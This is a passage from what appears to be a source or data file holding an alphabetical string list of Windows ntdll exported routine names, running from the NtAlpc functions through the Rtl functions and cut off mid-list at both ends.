"NtAlpcDeletePortSection", "NtAlpcDeleteResourceReserve", "NtAlpcDeleteSectionView", "NtAlpcDeleteSecurityContext", "NtAlpcDisconnectPort", "NtAlpcImpersonateClientContainerOfPort", "NtAlpcImpersonateClientOfPort", "NtAlpcOpenSenderProcess", "NtAlpcOpenSenderThread", "NtAlpcQueryInformation", "NtAlpcQueryInformationMessage", "NtAlpcRevokeSecurityContext", "NtAlpcSendWaitReceivePort", "NtAlpcSetInformation", "NtApphelpCacheControl", "NtAreMappedFilesTheSame", "NtAssignProcessToJobObject", "NtAssociateWaitCompletionPacket", "NtCallEnclave", "NtCallbackReturn", "NtCancelIoFile", "NtCancelIoFileEx", "NtCancelSynchronousIoFile", "NtCancelTimer", "NtCancelTimer2", "NtCancelWaitCompletionPacket", "NtClearEvent", "NtClose", "NtCloseObjectAuditAlarm", "NtCommitComplete", "NtCommitEnlistment", "NtCommitRegistryTransaction", "NtCommitTransaction", "NtCompactKeys", "NtCompareObjects", "NtCompareSigningLevels", "NtCompareTokens", "NtCompleteConnectPort", "NtCompressKey", "NtConnectPort", "NtContinue", "NtContinueEx", "NtConvertBetweenAuxiliaryCounterAndPerformanceCounter", "NtCreateCrossVmEvent", "NtCreateCrossVmMutant", "NtCreateDebugObject", "NtCreateDirectoryObject", "NtCreateDirectoryObjectEx", "NtCreateEnclave", "NtCreateEnlistment", "NtCreateEvent", "NtCreateEventPair", "NtCreateFile", "NtCreateIRTimer", "NtCreateIoCompletion", "NtCreateJobObject", "NtCreateJobSet", "NtCreateKey", "NtCreateKeyTransacted", "NtCreateKeyedEvent", "NtCreateLowBoxToken", "NtCreateMailslotFile", "NtCreateMutant", "NtCreateNamedPipeFile", "NtCreatePagingFile", "NtCreatePartition", "NtCreatePort", "NtCreatePrivateNamespace", "NtCreateProcess", "NtCreateProcessEx", "NtCreateProfile", "NtCreateProfileEx", "NtCreateRegistryTransaction", "NtCreateResourceManager", "NtCreateSection", "NtCreateSectionEx", "NtCreateSemaphore", "NtCreateSymbolicLinkObject", "NtCreateThread", "NtCreateThreadEx", "NtCreateTimer", "NtCreateTimer2", "NtCreateToken", "NtCreateTokenEx", "NtCreateTransaction", "NtCreateTransactionManager", "NtCreateUserProcess", "NtCreateWaitCompletionPacket", "NtCreateWaitablePort", "NtCreateWnfStateName", "NtCreateWorkerFactory", "NtDebugActiveProcess", "NtDebugContinue", "NtDelayExecution", "NtDeleteAtom", "NtDeleteBootEntry", "NtDeleteDriverEntry", "NtDeleteFile", "NtDeleteKey", "NtDeleteObjectAuditAlarm", "NtDeletePrivateNamespace", "NtDeleteValueKey", "NtDeleteWnfStateData", "NtDeleteWnfStateName", "NtDeviceIoControlFile", "NtDirectGraphicsCall", "NtDisableLastKnownGood", "NtDisplayString", "NtDrawText", "NtDuplicateObject", "NtDuplicateToken", "NtEnableLastKnownGood", "NtEnumerateBootEntries", "NtEnumerateDriverEntries", "NtEnumerateKey", "NtEnumerateSystemEnvironmentValuesEx", "NtEnumerateTransactionObject", "NtEnumerateValueKey", "NtExtendSection", "NtFilterBootOption", "NtFilterToken", "NtFilterTokenEx", "NtFindAtom", "NtFlushBuffersFile", "NtFlushBuffersFileEx", "NtFlushInstallUILanguage", "NtFlushInstructionCache", "NtFlushKey", "NtFlushProcessWriteBuffers", "NtFlushVirtualMemory", "NtFlushWriteBuffer", "NtFreeUserPhysicalPages", "NtFreeVirtualMemory", "NtFreezeRegistry", "NtFreezeTransactions", "NtFsControlFile", "NtGetCachedSigningLevel", "NtGetCompleteWnfStateSubscription", "NtGetContextThread", "NtGetCurrentProcessorNumber", "NtGetCurrentProcessorNumberEx", "NtGetDevicePowerState", "NtGetMUIRegistryInfo", "NtGetNextProcess", "NtGetNextThread", "NtGetNlsSectionPtr", "NtGetNotificationResourceManager", "NtGetTickCount", "NtGetWriteWatch", "NtImpersonateAnonymousToken", "NtImpersonateClientOfPort", "NtImpersonateThread", "NtInitializeEnclave", "NtInitializeNlsFiles", "NtInitializeRegistry", "NtInitiatePowerAction", "NtIsProcessInJob", "NtIsSystemResumeAutomatic", "NtIsUILanguageComitted", "NtListenPort", "NtLoadDriver", "NtLoadEnclaveData", "NtLoadKey", "NtLoadKey2", "NtLoadKey3", "NtLoadKeyEx", "NtLockFile", "NtLockProductActivationKeys", "NtLockRegistryKey", "NtLockVirtualMemory", "NtMakePermanentObject", "NtMakeTemporaryObject", "NtManageHotPatch", "NtManagePartition", "NtMapCMFModule", "NtMapUserPhysicalPages", "NtMapUserPhysicalPagesScatter", "NtMapViewOfSection", "NtMapViewOfSectionEx", "NtModifyBootEntry", "NtModifyDriverEntry", "NtNotifyChangeDirectoryFile", "NtNotifyChangeDirectoryFileEx", "NtNotifyChangeKey", "NtNotifyChangeMultipleKeys", "NtNotifyChangeSession", "NtOpenDirectoryObject", "NtOpenEnlistment", "NtOpenEvent", "NtOpenEventPair", "NtOpenFile", "NtOpenIoCompletion", "NtOpenJobObject", "NtOpenKey", "NtOpenKeyEx", "NtOpenKeyTransacted", "NtOpenKeyTransactedEx", "NtOpenKeyedEvent", "NtOpenMutant", "NtOpenObjectAuditAlarm", "NtOpenPartition", "NtOpenPrivateNamespace", "NtOpenProcess", "NtOpenProcessToken", "NtOpenProcessTokenEx", "NtOpenRegistryTransaction", "NtOpenResourceManager", "NtOpenSection", "NtOpenSemaphore", "NtOpenSession", "NtOpenSymbolicLinkObject", "NtOpenThread", "NtOpenThreadToken", "NtOpenThreadTokenEx", "NtOpenTimer", "NtOpenTransaction", "NtOpenTransactionManager", "NtPlugPlayControl", "NtPowerInformation", "NtPrePrepareComplete", "NtPrePrepareEnlistment", "NtPrepareComplete", "NtPrepareEnlistment", "NtPrivilegeCheck", "NtPrivilegeObjectAuditAlarm", "NtPrivilegedServiceAuditAlarm", "NtPropagationComplete", "NtPropagationFailed", "NtProtectVirtualMemory", "NtPssCaptureVaSpaceBulk", "NtPulseEvent", "NtQueryAttributesFile", "NtQueryAuxiliaryCounterFrequency", "NtQueryBootEntryOrder", "NtQueryBootOptions", "NtQueryDebugFilterState", "NtQueryDefaultLocale", "NtQueryDefaultUILanguage", "NtQueryDirectoryFile", "NtQueryDirectoryFileEx", "NtQueryDirectoryObject", "NtQueryDriverEntryOrder", "NtQueryEaFile", "NtQueryEvent", "NtQueryFullAttributesFile", "NtQueryInformationAtom", "NtQueryInformationByName", "NtQueryInformationEnlistment", "NtQueryInformationFile", "NtQueryInformationJobObject", "NtQueryInformationPort", "NtQueryInformationProcess", "NtQueryInformationResourceManager", "NtQueryInformationThread", "NtQueryInformationToken", "NtQueryInformationTransaction", "NtQueryInformationTransactionManager", "NtQueryInformationWorkerFactory", "NtQueryInstallUILanguage", "NtQueryIntervalProfile", "NtQueryIoCompletion", "NtQueryKey", "NtQueryLicenseValue", "NtQueryMultipleValueKey", "NtQueryMutant", "NtQueryObject", "NtQueryOpenSubKeys", "NtQueryOpenSubKeysEx", "NtQueryPerformanceCounter", "NtQueryPortInformationProcess", "NtQueryQuotaInformationFile", "NtQuerySection", "NtQuerySecurityAttributesToken", "NtQuerySecurityObject", "NtQuerySecurityPolicy", "NtQuerySemaphore", "NtQuerySymbolicLinkObject", "NtQuerySystemEnvironmentValue", "NtQuerySystemEnvironmentValueEx", "NtQuerySystemInformation", "NtQuerySystemInformationEx", "NtQuerySystemTime", "NtQueryTimer", "NtQueryTimerResolution", "NtQueryValueKey", "NtQueryVirtualMemory", "NtQueryVolumeInformationFile", "NtQueryWnfStateData", "NtQueryWnfStateNameInformation", "NtQueueApcThread", "NtQueueApcThreadEx", "NtRaiseException", "NtRaiseHardError", "NtReadFile", "NtReadFileScatter", "NtReadOnlyEnlistment", "NtReadRequestData", "NtReadVirtualMemory", "NtRecoverEnlistment", "NtRecoverResourceManager", "NtRecoverTransactionManager", "NtRegisterProtocolAddressInformation", "NtRegisterThreadTerminatePort", "NtReleaseKeyedEvent", "NtReleaseMutant", "NtReleaseSemaphore", "NtReleaseWorkerFactoryWorker", "NtRemoveIoCompletion", "NtRemoveIoCompletionEx", "NtRemoveProcessDebug", "NtRenameKey", "NtRenameTransactionManager", "NtReplaceKey", "NtReplacePartitionUnit", "NtReplyPort", "NtReplyWaitReceivePort", "NtReplyWaitReceivePortEx", "NtReplyWaitReplyPort", "NtRequestPort", "NtRequestWaitReplyPort", "NtResetEvent", "NtResetWriteWatch", "NtRestoreKey", "NtResumeProcess", "NtResumeThread", "NtRevertContainerImpersonation", "NtRollbackComplete", "NtRollbackEnlistment", "NtRollbackRegistryTransaction", "NtRollbackTransaction", "NtRollforwardTransactionManager", "NtSaveKey", "NtSaveKeyEx", "NtSaveMergedKeys", "NtSecureConnectPort", "NtSerializeBoot", "NtSetBootEntryOrder", "NtSetBootOptions", "NtSetCachedSigningLevel", "NtSetCachedSigningLevel2", "NtSetContextThread", "NtSetDebugFilterState", "NtSetDefaultHardErrorPort", "NtSetDefaultLocale", "NtSetDefaultUILanguage", "NtSetDriverEntryOrder", "NtSetEaFile", "NtSetEvent", "NtSetEventBoostPriority", "NtSetHighEventPair", "NtSetHighWaitLowEventPair", "NtSetIRTimer", "NtSetInformationDebugObject", "NtSetInformationEnlistment", "NtSetInformationFile", "NtSetInformationJobObject", "NtSetInformationKey", "NtSetInformationObject", "NtSetInformationProcess", "NtSetInformationResourceManager", "NtSetInformationSymbolicLink", "NtSetInformationThread", "NtSetInformationToken", "NtSetInformationTransaction", "NtSetInformationTransactionManager", "NtSetInformationVirtualMemory", "NtSetInformationWorkerFactory", "NtSetIntervalProfile", "NtSetIoCompletion", "NtSetIoCompletionEx", "NtSetLdtEntries", "NtSetLowEventPair", "NtSetLowWaitHighEventPair", "NtSetQuotaInformationFile", "NtSetSecurityObject", "NtSetSystemEnvironmentValue", "NtSetSystemEnvironmentValueEx", "NtSetSystemInformation", "NtSetSystemPowerState", "NtSetSystemTime", "NtSetThreadExecutionState", "NtSetTimer", "NtSetTimer2", "NtSetTimerEx", "NtSetTimerResolution", "NtSetUuidSeed", "NtSetValueKey", "NtSetVolumeInformationFile", "NtSetWnfProcessNotificationEvent", "NtShutdownSystem", "NtShutdownWorkerFactory", "NtSignalAndWaitForSingleObject", "NtSinglePhaseReject", "NtStartProfile", "NtStopProfile", "NtSubscribeWnfStateChange", "NtSuspendProcess", "NtSuspendThread", "NtSystemDebugControl", "NtTerminateEnclave", "NtTerminateJobObject", "NtTerminateProcess", "NtTerminateThread", "NtTestAlert", "NtThawRegistry", "NtThawTransactions", "NtTraceControl", "NtTraceEvent", "NtTranslateFilePath", "NtUmsThreadYield", "NtUnloadDriver", "NtUnloadKey", "NtUnloadKey2", "NtUnloadKeyEx", "NtUnlockFile", "NtUnlockVirtualMemory", "NtUnmapViewOfSection", "NtUnmapViewOfSectionEx", "NtUnsubscribeWnfStateChange", "NtUpdateWnfStateData", "NtVdmControl", "NtWaitForAlertByThreadId", "NtWaitForDebugEvent", "NtWaitForKeyedEvent", "NtWaitForMultipleObjects", "NtWaitForMultipleObjects32", "NtWaitForSingleObject", "NtWaitForWorkViaWorkerFactory", "NtWaitHighEventPair", "NtWaitLowEventPair", "NtWorkerFactoryWorkerReady", "NtWriteFile", "NtWriteFileGather", "NtWriteRequestData", "NtWriteVirtualMemory", "NtYieldExecution", "PssNtCaptureSnapshot", "PssNtDuplicateSnapshot", "PssNtFreeRemoteSnapshot", "PssNtFreeSnapshot", "PssNtFreeWalkMarker", "PssNtQuerySnapshot", "PssNtValidateDescriptor", "PssNtWalkSnapshot", "RtlAbortRXact", "RtlAbsoluteToSelfRelativeSD", "RtlAcquirePebLock", "RtlAcquirePrivilege", "RtlAcquireReleaseSRWLockExclusive", "RtlAcquireResourceExclusive", "RtlAcquireResourceShared", "RtlAcquireSRWLockExclusive", "RtlAcquireSRWLockShared", "RtlActivateActivationContext", "RtlActivateActivationContextEx", "RtlActivateActivationContextUnsafeFast", "RtlAddAccessAllowedAce", "RtlAddAccessAllowedAceEx", "RtlAddAccessAllowedObjectAce", "RtlAddAccessDeniedAce", "RtlAddAccessDeniedAceEx", "RtlAddAccessDeniedObjectAce", "RtlAddAccessFilterAce", "RtlAddAce", "RtlAddActionToRXact", "RtlAddAtomToAtomTable", "RtlAddAttributeActionToRXact", "RtlAddAuditAccessAce", "RtlAddAuditAccessAceEx", "RtlAddAuditAccessObjectAce", "RtlAddCompoundAce", "RtlAddFunctionTable", "RtlAddGrowableFunctionTable", "RtlAddIntegrityLabelToBoundaryDescriptor", "RtlAddMandatoryAce", "RtlAddProcessTrustLabelAce", "RtlAddRefActivationContext", "RtlAddRefMemoryStream", "RtlAddResourceAttributeAce", "RtlAddSIDToBoundaryDescriptor", "RtlAddScopedPolicyIDAce", "RtlAddVectoredContinueHandler", "RtlAddVectoredExceptionHandler", "RtlAddressInSectionTable", "RtlAdjustPrivilege", "RtlAllocateActivationContextStack", "RtlAllocateAndInitializeSid", "RtlAllocateAndInitializeSidEx", "RtlAllocateHandle", "RtlAllocateHeap", "RtlAllocateMemoryBlockLookaside", "RtlAllocateMemoryZone", "RtlAllocateWnfSerializationGroup", "RtlAnsiCharToUnicodeChar", "RtlAnsiStringToUnicodeSize", "RtlAnsiStringToUnicodeString", "RtlAppendAsciizToString", "RtlAppendPathElement", "RtlAppendStringToString", "RtlAppendUnicodeStringToString", "RtlAppendUnicodeToString", "RtlApplicationVerifierStop", "RtlApplyRXact", "RtlApplyRXactNoFlush", "RtlAppxIsFileOwnedByTrustedInstaller", "RtlAreAllAccessesGranted", "RtlAreAnyAccessesGranted", "RtlAreBitsClear", "RtlAreBitsClearEx", "RtlAreBitsSet", "RtlAreLongPathsEnabled", "RtlAssert", "RtlAvlInsertNodeEx", "RtlAvlRemoveNode", "RtlBarrier", "RtlBarrierForDelete", "RtlCallEnclaveReturn", "RtlCancelTimer", "RtlCanonicalizeDomainName", "RtlCapabilityCheck", "RtlCapabilityCheckForSingleSessionSku", "RtlCaptureContext", "RtlCaptureContext2", "RtlCaptureStackBackTrace", "RtlCharToInteger", "RtlCheckBootStatusIntegrity", "RtlCheckForOrphanedCriticalSections", "RtlCheckPortableOperatingSystem", "RtlCheckRegistryKey", "RtlCheckSandboxedToken", "RtlCheckSystemBootStatusIntegrity", "RtlCheckTokenCapability", "RtlCheckTokenMembership", "RtlCheckTokenMembershipEx", "RtlCleanUpTEBLangLists", "RtlClearAllBits", "RtlClearAllBitsEx", "RtlClearBit", "RtlClearBitEx", "RtlClearBits", "RtlClearBitsEx", "RtlClearThreadWorkOnBehalfTicket", "RtlCloneMemoryStream", "RtlCloneUserProcess", "RtlCmDecodeMemIoResource", "RtlCmEncodeMemIoResource", "RtlCommitDebugInfo", "RtlCommitMemoryStream", "RtlCompactHeap", "RtlCompareAltitudes", "RtlCompareMemory", "RtlCompareMemoryUlong", "RtlCompareString", "RtlCompareUnicodeString", "RtlCompareUnicodeStrings", "RtlCompleteProcessCloning", "RtlCompressBuffer", "RtlComputeCrc32", "RtlComputeImportTableHash", "RtlComputePrivatizedDllName_U", "RtlConnectToSm", "RtlConsoleMultiByteToUnicodeN", "RtlConstructCrossVmEventPath", "RtlConstructCrossVmMutexPath", "RtlContractHashTable", "RtlConvertDeviceFamilyInfoToString", "RtlConvertExclusiveToShared", "RtlConvertLCIDToString", "RtlConvertSRWLockExclusiveToShared", "RtlConvertSharedToExclusive", "RtlConvertSidToUnicodeString", "RtlConvertToAutoInheritSecurityObject", "RtlCopyBitMap", "RtlCopyContext", "RtlCopyExtendedContext", "RtlCopyLuid", "RtlCopyLuidAndAttributesArray", "RtlCopyMappedMemory", "RtlCopyMemory", "RtlCopyMemoryNonTemporal", "RtlCopyMemoryStreamTo", "RtlCopyOutOfProcessMemoryStreamTo", "RtlCopySecurityDescriptor", "RtlCopySid", "RtlCopySidAndAttributesArray", "RtlCopyString", "RtlCopyUnicodeString", "RtlCrc32", "RtlCrc64", "RtlCreateAcl", "RtlCreateActivationContext", "RtlCreateAndSetSD", "RtlCreateAtomTable", "RtlCreateBootStatusDataFile", "RtlCreateBoundaryDescriptor", "RtlCreateEnvironment", "RtlCreateEnvironmentEx", "RtlCreateHashTable", "RtlCreateHashTableEx", "RtlCreateHeap", "RtlCreateMemoryBlockLookaside", "RtlCreateMemoryZone", "RtlCreateProcessParameters", "RtlCreateProcessParametersEx", "RtlCreateProcessParametersWithTemplate", "RtlCreateProcessReflection", "RtlCreateQueryDebugBuffer", "RtlCreateRegistryKey", "RtlCreateSecurityDescriptor", "RtlCreateServiceSid", "RtlCreateSystemVolumeInformationFolder", "RtlCreateTagHeap", "RtlCreateTimer", "RtlCreateTimerQueue", "RtlCreateUmsCompletionList", "RtlCreateUmsThreadContext", "RtlCreateUnicodeString", "RtlCreateUnicodeStringFromAsciiz", "RtlCreateUserFiberShadowStack", "RtlCreateUserProcess", "RtlCreateUserProcessEx", "RtlCreateUserSecurityObject", "RtlCreateUserStack", "RtlCreateUserThread", "RtlCreateVirtualAccountSid", "RtlCultureNameToLCID", "RtlCustomCPToUnicodeN", "RtlCutoverTimeToSystemTime", "RtlDeCommitDebugInfo", "RtlDeNormalizeProcessParams", "RtlDeactivateActivationContext", "RtlDeactivateActivationContextUnsafeFast", "RtlDebugPrintTimes", "RtlDecodePointer", "RtlDecodeRemotePointer", "RtlDecodeSystemPointer", "RtlDecompressBuffer", "RtlDecompressBufferEx", "RtlDecompressFragment", "RtlDefaultNpAcl", "RtlDelete", "RtlDeleteAce", "RtlDeleteAtomFromAtomTable", "RtlDeleteBarrier", "RtlDeleteBoundaryDescriptor", "RtlDeleteCriticalSection", "RtlDeleteElementGenericTable", "RtlDeleteElementGenericTableAvl", "RtlDeleteElementGenericTableAvlEx", "RtlDeleteFunctionTable", "RtlDeleteGrowableFunctionTable", "RtlDeleteHashTable", "RtlDeleteNoSplay", "RtlDeleteRegistryValue", "RtlDeleteResource", "RtlDeleteSecurityObject", "RtlDeleteTimer", "RtlDeleteTimerQueue", "RtlDeleteTimerQueueEx", "RtlDeleteUmsCompletionList", "RtlDeleteUmsThreadContext", "RtlDequeueUmsCompletionListItems", "RtlDeregisterSecureMemoryCacheCallback", "RtlDeregisterWait", "RtlDeregisterWaitEx", "RtlDeriveCapabilitySidsFromName", "RtlDestroyAtomTable", "RtlDestroyEnvironment", "RtlDestroyHandleTable", "RtlDestroyHeap", "RtlDestroyMemoryBlockLookaside", "RtlDestroyMemoryZone", "RtlDestroyProcessParameters", "RtlDestroyQueryDebugBuffer", "RtlDetectHeapLeaks", "RtlDetermineDosPathNameType_U", "RtlDisableThreadProfiling", "RtlDisownModuleHeapAllocation", "RtlDllShutdownInProgress", "RtlDnsHostNameToComputerName", "RtlDoesFileExists_U", "RtlDoesNameContainWildCards", "RtlDosApplyFileIsolationRedirection_Ustr", "RtlDosLongPathNameToNtPathName_U_WithStatus", "RtlDosLongPathNameToRelativeNtPathName_U_WithStatus", "RtlDosPathNameToNtPathName_U", "RtlDosPathNameToNtPathName_U_WithStatus", "RtlDosPathNameToRelativeNtPathName_U", "RtlDosPathNameToRelativeNtPathName_U_WithStatus", "RtlDosSearchPath_U", "RtlDosSearchPath_Ustr", "RtlDowncaseUnicodeChar", "RtlDowncaseUnicodeString", "RtlDrainNonVolatileFlush", "RtlDumpResource", "RtlDuplicateUnicodeString", "RtlEmptyAtomTable", "RtlEnableEarlyCriticalSectionEventCreation", "RtlEnableThreadProfiling", "RtlEnclaveCallDispatch", "RtlEnclaveCallDispatchReturn", "RtlEncodePointer", "RtlEncodeRemotePointer", "RtlEncodeSystemPointer", "RtlEndEnumerationHashTable", "RtlEndStrongEnumerationHashTable", "RtlEndWeakEnumerationHashTable", "RtlEnterCriticalSection", "RtlEnterUmsSchedulingMode", "RtlEnumProcessHeaps", "RtlEnumerateEntryHashTable", "RtlEnumerateGenericTable", "RtlEnumerateGenericTableAvl", "RtlEnumerateGenericTableLikeADirectory", "RtlEnumerateGenericTableWithoutSplaying", "RtlEnumerateGenericTableWithoutSplayingAvl", "RtlEqualComputerName", "RtlEqualDomainName", "RtlEqualLuid", "RtlEqualPrefixSid", "RtlEqualSid", "RtlEqualString", "RtlEqualUnicodeString", "RtlEqualWnfChangeStamps", "RtlEraseUnicodeString", "RtlEthernetAddressToStringA", "RtlEthernetAddressToStringW", "RtlEthernetStringToAddressA", "RtlEthernetStringToAddressW", "RtlExecuteUmsThread", "RtlExitUserProcess", "RtlExitUserThread", "RtlExpandEnvironmentStrings", "RtlExpandEnvironmentStrings_U", "RtlExpandHashTable", "RtlExtendCorrelationVector", "RtlExtendMemoryBlockLookaside", "RtlExtendMemoryZone", "RtlExtractBitMap", "RtlFillMemory", "RtlFillMemoryNonTemporal", "RtlFillNonVolatileMemory", "RtlFinalReleaseOutOfProcessMemoryStream", "RtlFindAceByType", "RtlFindActivationContextSectionGuid", "RtlFindActivationContextSectionString", "RtlFindCharInUnicodeString", "RtlFindClearBits", "RtlFindClearBitsAndSet", "RtlFindClearBitsEx", "RtlFindClearRuns", "RtlFindClosestEncodableLength", "RtlFindExportedRoutineByName", "RtlFindLastBackwardRunClear", "RtlFindLeastSignificantBit", "RtlFindLongestRunClear", "RtlFindMessage", "RtlFindMostSignificantBit", "RtlFindNextForwardRunClear", "RtlFindSetBits", "RtlFindSetBitsAndClear", "RtlFindSetBitsAndClearEx", "RtlFindSetBitsEx", "RtlFindUnicodeSubstring", "RtlFirstEntrySList", "RtlFirstFreeAce", "RtlFlsAlloc", "RtlFlsFree", "RtlFlsGetValue", "RtlFlsSetValue", "RtlFlushHeaps", "RtlFlushNonVolatileMemory", "RtlFlushNonVolatileMemoryRanges", "RtlFlushSecureMemoryCache", "RtlFormatCurrentUserKeyPath", "RtlFormatMessage", "RtlFormatMessageEx", "RtlFreeActivationContextStack", "RtlFreeAnsiString", "RtlFreeHandle", "RtlFreeHeap", "RtlFreeMemoryBlockLookaside", "RtlFreeNonVolatileToken", "RtlFreeOemString", "RtlFreeSid", "RtlFreeThreadActivationContextStack", "RtlFreeUTF8String", "RtlFreeUnicodeString", "RtlFreeUserFiberShadowStack", "RtlFreeUserStack", "RtlGUIDFromString", "RtlGenerate8dot3Name", "RtlGetAce", "RtlGetActiveActivationContext", "RtlGetActiveConsoleId", "RtlGetAppContainerNamedObjectPath", "RtlGetAppContainerParent", "RtlGetAppContainerSidType", "RtlGetCallersAddress", "RtlGetCompressionWorkSpaceSize", "RtlGetConsoleSessionForegroundProcessId", "RtlGetControlSecurityDescriptor", "RtlGetCriticalSectionRecursionCount", "RtlGetCurrentDirectory_U", "RtlGetCurrentPeb", "RtlGetCurrentProcessorNumber", "RtlGetCurrentProcessorNumberEx", "RtlGetCurrentServiceSessionId", "RtlGetCurrentTransaction", "RtlGetCurrentUmsThread", "RtlGetDaclSecurityDescriptor", "RtlGetDeviceFamilyInfoEnum", "RtlGetElementGenericTable", "RtlGetElementGenericTableAvl", "RtlGetEnabledExtendedFeatures", "RtlGetExePath", "RtlGetExtendedContextLength", "RtlGetExtendedContextLength2", "RtlGetExtendedFeaturesMask", "RtlGetFileMUIPath", "RtlGetFrame", "RtlGetFullPathName_U", "RtlGetFullPathName_UEx", "RtlGetFullPathName_UstrEx", "RtlGetFunctionTableListHead", "RtlGetGroupSecurityDescriptor", "RtlGetIntegerAtom", "RtlGetInterruptTimePrecise", "RtlGetLastNtStatus", "RtlGetLastWin32Error", "RtlGetLengthWithoutLastFullDosOrNtPathElement", "RtlGetLengthWithoutTrailingPathSeperators", "RtlGetLocaleFileMappingAddress", "RtlGetLongestNtPathLength", "RtlGetMultiTimePrecise", "RtlGetNativeSystemInformation", "RtlGetNextEntryHashTable", "RtlGetNextUmsListItem", "RtlGetNonVolatileToken", "RtlGetNtGlobalFlags", "RtlGetNtProductType", "RtlGetNtSystemRoot", "RtlGetNtVersionNumbers", "RtlGetOwnerSecurityDescriptor", "RtlGetParentLocaleName", "RtlGetPersistedStateLocation", "RtlGetProcessHeaps", "RtlGetProcessPreferredUILanguages", "RtlGetProductInfo", "RtlGetReturnAddressHijackTarget", "RtlGetSaclSecurityDescriptor", "RtlGetSearchPath", "RtlGetSecurityDescriptorRMControl", "RtlGetSessionProperties", "RtlGetSetBootStatusData", "RtlGetSuiteMask", "RtlGetSystemBootStatus", "RtlGetSystemBootStatusEx", "RtlGetSystemPreferredUILanguages", "RtlGetSystemTimePrecise", "RtlGetThreadErrorMode", "RtlGetThreadLangIdByIndex", "RtlGetThreadPreferredUILanguages", "RtlGetThreadWorkOnBehalfTicket", "RtlGetTokenNamedObjectPath", "RtlGetUILanguageInfo", "RtlGetUmsCompletionListEvent", "RtlGetUnloadEventTrace", "RtlGetUnloadEventTraceEx", "RtlGetUserInfoHeap", "RtlGetUserPreferredUILanguages", "RtlGetVersion", "RtlGrowFunctionTable", "RtlGuardCheckLongJumpTarget", "RtlHashUnicodeString", "RtlHeapTrkInitialize", "RtlIdentifierAuthoritySid", "RtlIdnToAscii", "RtlIdnToNameprepUnicode", "RtlIdnToUnicode", "RtlImageDirectoryEntryToData", "RtlImageNtHeader", "RtlImageNtHeaderEx", "RtlImageRvaToSection", "RtlImageRvaToVa", "RtlImpersonateSelf", "RtlImpersonateSelfEx", "RtlIncrementCorrelationVector", "RtlInitAnsiString", "RtlInitAnsiStringEx", "RtlInitBarrier", "RtlInitCodePageTable", "RtlInitEnumerationHashTable", "RtlInitMemoryStream", "RtlInitNlsTables", "RtlInitOutOfProcessMemoryStream", "RtlInitString", "RtlInitStringEx", "RtlInitStrongEnumerationHashTable", "RtlInitUTF8String", "RtlInitUTF8StringEx", "RtlInitUnicodeString", "RtlInitUnicodeStringEx", "RtlInitWeakEnumerationHashTable", "RtlInitializeAtomPackage", "RtlInitializeBitMap", "RtlInitializeBitMapEx", "RtlInitializeConditionVariable", "RtlInitializeContext", "RtlInitializeCorrelationVector", "RtlInitializeCriticalSection", "RtlInitializeCriticalSectionAndSpinCount", "RtlInitializeCriticalSectionEx", "RtlInitializeExtendedContext", "RtlInitializeExtendedContext2", "RtlInitializeGenericTable", "RtlInitializeGenericTableAvl", "RtlInitializeHandleTable", "RtlInitializeNtUserPfn", "RtlInitializeRXact", "RtlInitializeResource", "RtlInitializeSListHead", "RtlInitializeSRWLock", "RtlInitializeSid", "RtlInitializeSidEx", "RtlInsertElementGenericTable", "RtlInsertElementGenericTableAvl", "RtlInsertElementGenericTableFull", "RtlInsertElementGenericTableFullAvl", "RtlInsertEntryHashTable", "RtlInstallFunctionTableCallback", "RtlInt64ToUnicodeString", "RtlIntegerToChar", "RtlIntegerToUnicodeString", "RtlInterlockedClearBitRun", "RtlInterlockedFlushSList", "RtlInterlockedPopEntrySList", "RtlInterlockedPushEntrySList", "RtlInterlockedPushListSList", "RtlInterlockedPushListSListEx", "RtlInterlockedSetBitRun", "RtlIoDecodeMemIoResource", "RtlIoEncodeMemIoResource", "RtlIpv4AddressToStringA", "RtlIpv4AddressToStringExA", "RtlIpv4AddressToStringExW", "RtlIpv4AddressToStringW", "RtlIpv4StringToAddressA", "RtlIpv4StringToAddressExA", "RtlIpv4StringToAddressExW", "RtlIpv4StringToAddressW", "RtlIpv6AddressToStringA", "RtlIpv6AddressToStringExA", "RtlIpv6AddressToStringExW", "RtlIpv6AddressToStringW", "RtlIpv6StringToAddressA", "RtlIpv6StringToAddressExA", "RtlIpv6StringToAddressExW", "RtlIpv6StringToAddressW", "RtlIsActivationContextActive", "RtlIsCapabilitySid", "RtlIsCloudFilesPlaceholder", "RtlIsCriticalSectionLocked", "RtlIsCriticalSectionLockedByThread", "RtlIsCurrentProcess", "RtlIsCurrentThread", "RtlIsCurrentThreadAttachExempt", "RtlIsDosDeviceName_U", "RtlIsElevatedRid", "RtlIsGenericTableEmpty", "RtlIsGenericTableEmptyAvl", "RtlIsMultiSessionSku", "RtlIsMultiUsersInSessionSku", "RtlIsNameInExpression", "RtlIsNameInUnUpcasedExpression", "RtlIsNameLegalDOS8Dot3", "RtlIsNonEmptyDirectoryReparsePointAllowed", "RtlIsNormalizedString", "RtlIsPackageSid", "RtlIsParentOfChildAppContainer", "RtlIsPartialPlaceholder", "RtlIsPartialPlaceholderFileHandle", "RtlIsPartialPlaceholderFileInfo", "RtlIsProcessorFeaturePresent", "RtlIsStateSeparationEnabled", "RtlIsTextUnicode", "RtlIsThreadWithinLoaderCallout", "RtlIsUntrustedObject", "RtlIsValidHandle", "RtlIsValidIndexHandle", "RtlIsValidLocaleName", "RtlIsValidProcessTrustLabelSid", "RtlIsZeroMemory", "RtlKnownExceptionFilter", "RtlLCIDToCultureName", "RtlLargeIntegerToChar", "RtlLcidToLocaleName", "RtlLeaveCriticalSection", "RtlLengthRequiredSid", "RtlLengthSecurityDescriptor", "RtlLengthSid", "RtlLengthSidAsUnicodeString", "RtlLoadString", "RtlLocalTimeToSystemTime", "RtlLocaleNameToLcid", "RtlLocateExtendedFeature", "RtlLocateExtendedFeature2", "RtlLocateLegacyContext", "RtlLockBootStatusData", "RtlLockCurrentThread", "RtlLockHeap", "RtlLockMemoryBlockLookaside", "RtlLockMemoryStreamRegion", "RtlLockMemoryZone", "RtlLockModuleSection", "RtlLogStackBackTrace", "RtlLookupAtomInAtomTable", "RtlLookupElementGenericTable", "RtlLookupElementGenericTableAvl", "RtlLookupElementGenericTableFull", "RtlLookupElementGenericTableFullAvl", "RtlLookupEntryHashTable", "RtlLookupFirstMatchingElementGenericTableAvl", "RtlLookupFunctionEntry", "RtlLookupFunctionTable", "RtlMakeSelfRelativeSD", "RtlMapGenericMask", "RtlMapSecurityErrorToNtStatus", "RtlMoveMemory", "RtlMultiAppendUnicodeStringBuffer", "RtlMultiByteToUnicodeN", "RtlMultiByteToUnicodeSize", "RtlMultipleAllocateHeap", "RtlMultipleFreeHeap", 